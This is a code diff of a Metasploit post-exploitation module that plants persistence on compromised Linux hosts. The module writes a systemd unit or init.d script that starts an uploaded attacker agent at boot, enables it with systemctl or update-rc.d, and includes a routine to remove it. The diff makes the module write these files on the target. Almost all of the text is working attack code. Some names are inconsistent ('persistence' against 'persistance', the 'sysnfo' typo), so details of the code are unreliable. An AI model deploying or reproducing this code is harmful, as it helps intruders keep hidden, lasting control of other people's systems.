@@ -110,7 +110,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.6',
+                        'Version'        => '$Revision: 1.7',
                         'DisclosureDate' => 'jun 2 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -197,9 +197,7 @@ if datastore['SYSTEMD'] == true
     #
     if session.fs.file.exist?(serv_file)
       print_error("systemd: #{serv_file} found ..")
-      print_error("Post-module reports that persistence its allready active ..")
-      print_error("Please set DEL_PERSISTENCE option before running this funtion ..")
-      print_line("")
+      print_error("Post-module reports that persistence its active ..")
       return nil
     end
     #
@@ -208,7 +206,6 @@ if datastore['SYSTEMD'] == true
     if not session.fs.file.exist?(remote_path)
       print_error("agent: #{remote_path} not found ..")
       print_error("Please upload your agent before running this funtion ..")
-      print_line("")
       return nil
     end
     print_status("Remote agent full path found ..")
@@ -218,35 +215,38 @@ if datastore['SYSTEMD'] == true
       #
       print_warning("Writing systemd persistence startup script ..")
       Rex::sleep(1.0)
-      File.open("#{serv_file}", "w") do |f|
-        f.write("[Unit]\n")
-        f.write("After=network.target network-online.target\n\n")
-        f.write("[Service]\n")
-        f.write("ExecStart=#{remote_path}\n\n")
-        f.write("[Install]\n")
-        f.write("WantedBy=default.target\n")
-        f.close
-      end
-      print_good("Service path: #{serv_file}")
+
+      systemd_data =
+      "[Unit]\n" +
+      "After=network.target network-online.target\n" +
+      "[Service]\n" +
+      "ExecStart=#{remote_path}\n" +
+      "[Install]\n" +
+      "WantedBy=default.target"
+
+      path = "#{serv_file}"
+        fd = session.fs.file.new(path, 'wb')
+        fd.write(systemd_data)
+        fd.close
+      print_status("Service path: #{serv_file}")
       Rex::sleep(1.0)
 
       #
       # Config systemd startup service (chmod + daemon-reload + systemctl enable)
       #
       if session.fs.file.exist?(serv_file)
-        print_good("Config systemd persistence script ..")
+        print_status("Config systemd persistence script ..")
         cmd_exec("chmod 664 #{serv_file}")
         Rex::sleep(1.0)
-        print_good("Reloading systemctl daemon ..")
+        print_status("Reloading systemctl daemon ..")
         cmd_exec("systemctl daemon-reload")
         Rex::sleep(1.0)
-        print_good("Enable systemctl service ..")
+        print_status("Enable systemctl service ..")
         cmd_exec("systemctl enable persistence.service")
         Rex::sleep(1.5)
       else
         print_error("systemd script: #{serv_file} not found ..")
         print_error("Persistence on: #{rem['Computer']} not achieved ..")
-        print_line("")
         return nil
       end
 
@@ -259,9 +259,7 @@ else
     #
     if session.fs.file.exist?(script_check)
       print_error("init.d: #{script_check} found ..")
-      print_error("Post-module reports that persistence its allready active ..")
-      print_error("Please set DEL_PERSISTENCE option before running this funtion ..")
-      print_line("")
+      print_error("Post-module reports that persistence its active ..")
       return nil
     end
     #
@@ -270,7 +268,6 @@ else
     if not session.fs.file.exist?(remote_path)
       print_error("agent: #{remote_path} not found ..")
       print_error("Please upload your agent before running this funtion ..")
-      print_line("")
       return nil
     end
     print_status("Remote agent full path found ..")
@@ -303,7 +300,6 @@ else
         print_error("Agent extension not supported ..")
         print_error("Please use [sh|elf|py|rb|pl] agent extensions ..")
         print_error("OR set 'SHELBANG false' to execute agent: ./root/agent")
-        print_line("")
         return nil
       end
     #
@@ -319,40 +315,43 @@ else
       #
       print_warning("Writing init.d persistence startup script ..")
       Rex::sleep(1.0)
-      File.open("#{script_check}", "w") do |f|
-        f.write("#!/bin/sh\n")
-        f.write("### BEGIN INIT INFO\n")
-        f.write("# Provides:          persistence on kali\n")
-        f.write("# Required-Start:    $network $local_fs $remote_fs\n")
-        f.write("# Required-Stop:     $remote_fs $local_fs\n")
-        f.write("# Default-Start:     2 3 4 5\n")
-        f.write("# Default-Stop:      0 1 6\n")
-        f.write("# Short-Description: Persiste your agent in kali linux distros.\n")
-        f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems\n")
-        f.write("### END INIT INFO\n\n")
-        f.write("# Give a little time to execute agent\n")
-        f.write("sleep #{stime} > /dev/null\n")
-        f.write("#{trigger}#{remote_path}")
-        f.close
-      end
-      print_good("Service path: #{script_check}")
+
+      initd_data =
+      "#!/bin/sh\n" +
+      "### BEGIN INIT INFO\n" +
+      "# Provides:          persistence on kali\n" +
+      "# Required-Start:    $network $local_fs $remote_fs\n" +
+      "# Required-Stop:     $remote_fs $local_fs\n" +
+      "# Default-Start:     2 3 4 5\n" +
+      "# Default-Stop:      0 1 6\n" +
+      "# Short-Description: Persiste your agent in kali linux distros.\n" +
+      "# Description:       Allows users to persiste your binary (elf) in kali linux systems\n" +
+      "### END INIT INFO\n" +
+      "# Give a little time to execute agent\n" +
+      "sleep #{stime} > /dev/null\n" +
+      "#{trigger}#{remote_path}"
+
+      path = "#{script_check}"
+        fd = session.fs.file.new(path, 'wb')
+        fd.write(initd_data)
+        fd.close
+      print_status("Service path: #{script_check}")
       Rex::sleep(1.0)
 
       #
       # Config init.d startup service (chmod + update-rc.d)
       #
       if session.fs.file.exist?(script_check)
-        print_good("Config init.d persistence script ..")
+        print_status("Config init.d persistence script ..")
         cmd_exec("chmod 755 #{script_check}")
         Rex::sleep(1.0)
-        print_good("Update init.d service status (symlinks) ..")
+        print_status("Update init.d service status (symlinks) ..")
         # update-rc.d persistance defaults # 97 03
         cmd_exec("update-rc.d persistance defaults")
         Rex::sleep(1.5)
       else
         print_error("init.d script: #{script_check} not found ..")
         print_error("Persistence on: #{rem['Computer']} not achieved ..")
-        print_line("")
         return nil
       end
 
@@ -362,15 +361,13 @@ end
     # Final displays to user ..
     #
     if datastore['SYSTEMD'] == true
-      print_status("Persistence achieved on: #{rem['Computer']}")
+      print_good("Persistence achieved on: #{rem['Computer']}")
       Rex::sleep(1.0)
-      print_status("To start service: systemctl start persistance.service")
+      print_warning("To start service: systemctl start persistence.service")
       Rex::sleep(1.0)
-      print_line("")
     else
-      print_status("Persistence achieved on: #{rem['Computer']}")
+      print_good("Persistence achieved on: #{rem['Computer']}")
       Rex::sleep(1.0)
-      print_line("")
     end
 
   #
@@ -420,7 +417,6 @@ if datastore['SYSTEMD'] == true
     if not session.fs.file.exist?(serv_file)
       print_error("script: #{serv_file} not found ..")
       print_error("Post-module reports that none persistence was found ..")
-      print_line("")
       return nil
     end
     print_status("Persistence script full path found ..")
@@ -428,10 +424,10 @@ if datastore['SYSTEMD'] == true
       #
       # Delete systemd script ..
       #
-      print_good("Removing script from systemd directory ..")
+      print_status("Removing script from systemd directory ..")
       cmd_exec("rm -f #{serv_file}")
       Rex::sleep(1.0)
-      print_good("Reloading systemctl daemon process ..")
+      print_status("Reloading systemctl daemon process ..")
       cmd_exec("sudo systemctl daemon-reload")
       Rex::sleep(1.5)
 
@@ -442,7 +438,6 @@ if datastore['SYSTEMD'] == true
       print_error("script: #{serv_file} not proper deleted ..")
       print_error("Please manually delete : rm -f #{serv_file}")
       print_error("Please manually execute: sudo systemctl daemon-reload")
-      print_line("")
       return nil
     end
 
@@ -456,7 +451,6 @@ else
     if not session.fs.file.exist?(script_check)
       print_error("script: #{script_check} not found ..")
       print_error("Post-module reports that none persistence was found ..")
-      print_line("")
       return nil
     end
     print_status("Persistence script full path found ..")
@@ -464,10 +458,10 @@ else
       #
       # Delete init.d script ..
       #
-      print_good("Deleting persistence service (symlinks) ..")
+      print_status("Deleting persistence service (symlinks) ..")
       cmd_exec("update-rc.d persistance remove")
       Rex::sleep(1.5)
-      print_good("Removing script from init.d directory ..")
+      print_status("Removing script from init.d directory ..")
       cmd_exec("rm -f #{script_check}")
       Rex::sleep(1.0)
 
@@ -478,7 +472,6 @@ else
       print_error("script: #{script_check} not proper deleted ..")
       print_error("Please manually delete : rm -f #{init}/persistance")
       print_error("Please manually execute: update-rc.d persistance remove")
-      print_line("")
       return nil
     end
 
@@ -487,10 +480,9 @@ end
     #
     # Final displays to user ..
     #
-    print_status("Persistence deleted from: #{rem['Computer']}")
+    print_good("Persistence deleted from: #{rem['Computer']}")
     print_warning("This module will NOT delete the agent from target ..")
     Rex::sleep(1.0)
-    print_line("")
 
   #
   # error exception funtion
@@ -595,7 +587,7 @@ def run
     # the non-return of sysinfo command reveals that we are not on a meterpreter session!
     #
     if not sysinfo.nil?
-      print_status("Running module against: #{sysnfo['Computer']}")
+      print_warning("Running module against: #{sysnfo['Computer']}")
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
